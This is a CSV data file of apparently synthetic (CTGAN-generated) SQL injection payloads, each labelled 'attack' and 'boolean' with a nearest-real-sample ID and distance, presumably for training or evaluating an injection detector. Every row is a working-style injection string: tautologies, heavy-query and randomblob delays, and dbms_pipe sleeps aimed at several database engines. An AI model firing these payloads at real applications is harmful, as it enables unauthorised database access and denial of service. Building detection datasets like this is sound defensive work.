id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000136,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R003504,5.628895148048944
CTGAN_000137,attack,boolean,-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,nearest_attack_euclidean,R002429,3.9908727719899755
CTGAN_000138,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R001294,5.660051493572802
CTGAN_000139,attack,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'gmbd'  =  'gmbd",nearest_attack_euclidean,R002021,4.45984188073779
CTGAN_000140,attack,boolean,"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003607,4.1425211610984265
CTGAN_000141,attack,boolean,1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,nearest_attack_euclidean,R000337,4.997874937186009
CTGAN_000142,attack,boolean,-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo,nearest_attack_euclidean,R000765,5.579368221916527
CTGAN_000143,attack,boolean,"1""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006",nearest_attack_euclidean,R000597,5.002584640612163
CTGAN_000144,attack,boolean,"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001379,4.8971633337295986
CTGAN_000145,attack,boolean,1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,nearest_attack_euclidean,R002323,5.578422707630611
CTGAN_000146,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000467,4.889365474345225
CTGAN_000147,attack,boolean,"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",nearest_attack_euclidean,R001658,5.295672741973666
CTGAN_000148,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002135,4.561014779703138
CTGAN_000149,attack,boolean,1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,nearest_attack_euclidean,R001000,3.967860729044593
CTGAN_000150,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000913,4.949325896767364
CTGAN_000151,attack,boolean,"1'  )   and make_set  (  6488  =  5525,5525  )  ",nearest_attack_euclidean,R003496,5.764255310842224
CTGAN_000152,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R003105,4.500008093244021
CTGAN_000153,attack,boolean,"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",nearest_attack_euclidean,R001229,7.61247209972086
CTGAN_000154,attack,boolean,"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",nearest_attack_euclidean,R001052,5.674109972375778
CTGAN_000155,attack,boolean,"1'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003279,5.813061935511008
CTGAN_000156,attack,boolean,"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",nearest_attack_euclidean,R001948,6.606261739771699
CTGAN_000157,attack,boolean,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000050,5.737663896323796
CTGAN_000158,attack,boolean,"1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000645,6.112998995107278
CTGAN_000159,attack,boolean,"1""   )    )    as svim where 4924  =  4924 and 7932  =  5870",nearest_attack_euclidean,R003050,3.235053825276439
CTGAN_000160,attack,boolean,"1%""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003559,7.174056933416924
CTGAN_000161,attack,boolean,"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",nearest_attack_euclidean,R001874,6.4649628119331055
CTGAN_000162,attack,boolean,"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003302,6.264230091952576
CTGAN_000163,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,6.443540457565364
CTGAN_000164,attack,boolean,"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000949,4.90648417839226
CTGAN_000165,attack,boolean,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",nearest_attack_euclidean,R000366,4.777856285387476
CTGAN_000166,attack,boolean,-9393' where 3119  =  3119 or 8571  =  8571--,nearest_attack_euclidean,R003219,4.2553551050701115
CTGAN_000167,attack,boolean,"1""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002983,5.172293735898411
CTGAN_000168,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001873,6.098291122400393
CTGAN_000169,attack,boolean,end and    (    (   6874  =  6874,nearest_attack_euclidean,R000905,5.129344051270419
CTGAN_000170,attack,boolean,"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'narn'  =  'narn",nearest_attack_euclidean,R003547,5.325382690033146
CTGAN_000171,attack,boolean,"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002809,5.80498424329496
CTGAN_000172,attack,boolean,"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",nearest_attack_euclidean,R000722,5.013553838537381
CTGAN_000173,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R001411,4.920309727732926
CTGAN_000174,attack,boolean,"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",nearest_attack_euclidean,R002687,4.226856052407114
CTGAN_000175,attack,boolean,1%'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R002658,6.229339953675638
CTGAN_000176,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R002342,5.257890366211469
CTGAN_000177,attack,boolean,-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,nearest_attack_euclidean,R003051,9.17574162598331
CTGAN_000178,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000972,5.770620988111483
CTGAN_000179,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bkag'  =  'bkag",nearest_attack_euclidean,R000656,3.4077585529027807
CTGAN_000180,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002728,6.882040456113782
CTGAN_000181,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,5.350345832837543
CTGAN_000182,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R003075,4.894374182227082
CTGAN_000183,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R001294,6.253134514793814
CTGAN_000184,attack,boolean,"hi' or 'x'  =  'x',",nearest_attack_euclidean,R000059,8.503290814812209
CTGAN_000185,attack,boolean,1'||  (  select 'dsjg' where 2402  =  2402 and 1947  =  7472--,nearest_attack_euclidean,R002841,4.803694289507052
CTGAN_000186,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,5.803523091599703
CTGAN_000187,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,4.308548051266422
CTGAN_000188,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,4.904263346773648
CTGAN_000189,attack,boolean,-5615'  )   where 5931  =  5931 or 8450  =  9229,nearest_attack_euclidean,R003323,5.390803686706678
CTGAN_000190,attack,boolean,"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",nearest_attack_euclidean,R001751,4.277941417992696
CTGAN_000191,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,7.044835335571427
CTGAN_000192,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000875,5.522852570612729
CTGAN_000193,attack,boolean,"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",nearest_attack_euclidean,R000614,5.914788895858679
CTGAN_000194,attack,boolean,1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,nearest_attack_euclidean,R000799,7.984448973552856
CTGAN_000195,attack,boolean,"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002313,5.840466041885399
CTGAN_000196,attack,boolean,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",nearest_attack_euclidean,R003469,6.424992578987526
CTGAN_000197,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",nearest_attack_euclidean,R001223,4.861954197845899
CTGAN_000198,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,nearest_attack_euclidean,R003605,4.809439629401405
CTGAN_000199,attack,boolean,"1   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002664,6.718062504520773
CTGAN_000200,attack,boolean,"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne",nearest_attack_euclidean,R003328,4.545235055622489
CTGAN_000201,attack,boolean,-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,nearest_attack_euclidean,R003051,4.476262436992365
CTGAN_000202,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R003516,5.751263423302835
CTGAN_000203,attack,boolean,"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R003646,5.171545909973569
CTGAN_000204,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R001133,4.061559543395513
CTGAN_000205,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R002994,5.836974090366225
CTGAN_000206,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",nearest_attack_euclidean,R001019,5.0898414343690925
CTGAN_000207,attack,boolean,"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",nearest_attack_euclidean,R003450,6.162441819270893
CTGAN_000208,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'ptou'  =  'ptou",nearest_attack_euclidean,R002039,4.454951899574237
CTGAN_000209,attack,boolean,1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'xnap'  =  'xnap,nearest_attack_euclidean,R000832,7.149269126239105
CTGAN_000210,attack,boolean,"-3637"" or   (  8459  =  8459  )  *4906",nearest_attack_euclidean,R000433,5.159148553717067
CTGAN_000211,attack,boolean,"1  )   and make_set  (  1559  =  4863,4863  )  ",nearest_attack_euclidean,R002428,5.038436397690029
CTGAN_000212,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002626,4.77420620892603
CTGAN_000213,attack,boolean,"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",nearest_attack_euclidean,R002145,5.174825991226153
CTGAN_000214,attack,boolean,"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001629,5.926170075882422
CTGAN_000215,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",nearest_attack_euclidean,R000578,4.715853360917242
CTGAN_000216,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R000742,5.854259830746111
CTGAN_000217,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R003105,6.407952822512309
CTGAN_000218,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001761,4.556185258724822
CTGAN_000219,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  5324  =  5324",nearest_attack_euclidean,R002874,3.304070758076407
CTGAN_000220,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000261,6.628983751502354
CTGAN_000221,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",nearest_attack_euclidean,R003184,4.937663863460938
CTGAN_000222,attack,boolean,"1""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001678,4.087757046466295
CTGAN_000223,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003254,4.861995479329997
CTGAN_000224,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,5.70581365580157
CTGAN_000225,attack,boolean,1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,nearest_attack_euclidean,R001708,4.498932591863012
CTGAN_000226,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R003299,6.191783226563256
CTGAN_000227,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002459,6.314377566539797
CTGAN_000228,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",nearest_attack_euclidean,R002286,5.9036448525944385
CTGAN_000229,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959",nearest_attack_euclidean,R001470,4.506624428198754
CTGAN_000230,attack,boolean,1'  )   where 8086  =  8086 and 1430  =  7941--,nearest_attack_euclidean,R003497,6.619611468410934
CTGAN_000231,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,4.965825391407381
CTGAN_000232,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R003105,5.262584393357514
CTGAN_000233,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R002173,4.087670829854888
CTGAN_000234,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,5.922440497853845
CTGAN_000235,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",nearest_attack_euclidean,R001804,7.5645643952033605
CTGAN_000236,attack,boolean,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R002066,4.901358369723476
CTGAN_000237,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",nearest_attack_euclidean,R003380,6.127946231823069
CTGAN_000238,attack,boolean,"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R001605,7.0362780818910124
CTGAN_000239,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000858,4.886763281215549
CTGAN_000240,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R003238,4.6795896242778126
CTGAN_000241,attack,boolean,-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,nearest_attack_euclidean,R001805,4.660708833875376
CTGAN_000242,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000378,4.776896868054417
CTGAN_000243,attack,boolean,-4484'   )    )    or 6872  =  6872 and    (    (   'oxuo'  =  'oxuo,nearest_attack_euclidean,R002956,5.828784090296776
CTGAN_000244,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R002079,2.553156123138883
CTGAN_000245,attack,boolean,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""bnyh""  =  ""bnyh",nearest_attack_euclidean,R002062,4.323187688066011
CTGAN_000246,attack,boolean,"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",nearest_attack_euclidean,R001402,6.334744042249186
CTGAN_000247,attack,boolean,"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",nearest_attack_euclidean,R000352,2.7459589383593035
CTGAN_000248,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",nearest_attack_euclidean,R001187,5.138999851450213
CTGAN_000249,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000488,5.877378148273056
CTGAN_000250,attack,boolean,"-5703'  )   or elt  (  2972  =  8708,8708  )  ",nearest_attack_euclidean,R003661,6.063426802174468
CTGAN_000251,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000071,5.7976299914876295
CTGAN_000252,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R002977,4.46664532805096
CTGAN_000253,attack,boolean,-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,nearest_attack_euclidean,R002647,5.726045030721236
CTGAN_000254,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000910,4.05176471900653
CTGAN_000255,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R002151,4.302467579026835
CTGAN_000256,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000834,6.5442478883270185
CTGAN_000257,attack,boolean,"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002737,5.853141980337933
CTGAN_000258,attack,boolean,"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",nearest_attack_euclidean,R000774,6.723600466048397
CTGAN_000259,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000488,4.731572891076399
CTGAN_000260,attack,boolean,"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001379,5.272671530103041
CTGAN_000261,attack,boolean,"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003499,7.175996851004292
CTGAN_000262,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R001509,6.133839953962105
CTGAN_000263,attack,boolean,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",nearest_attack_euclidean,R002409,4.477658391428123
CTGAN_000264,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R002698,6.654178825468825
CTGAN_000265,attack,boolean,"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",nearest_attack_euclidean,R000609,4.08411462969188
CTGAN_000266,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R001294,5.2305614749018705
CTGAN_000267,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R003377,3.0731538751911827
CTGAN_000268,attack,boolean,-1603'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'abmo'  =  'abmo,nearest_attack_euclidean,R000350,4.305717285495009
CTGAN_000269,attack,boolean,"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",nearest_attack_euclidean,R003404,6.227941549870193
CTGAN_000270,attack,boolean,"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",nearest_attack_euclidean,R002880,6.348925455188007
CTGAN_000271,attack,boolean,"1'+  (  select afst where 7454  =  7454 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",nearest_attack_euclidean,R000465,6.172140194219222
CTGAN_000272,attack,boolean,"-3637"" or   (  8459  =  8459  )  *4906",nearest_attack_euclidean,R000433,5.84742319785631
CTGAN_000273,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,4.4931676305586805
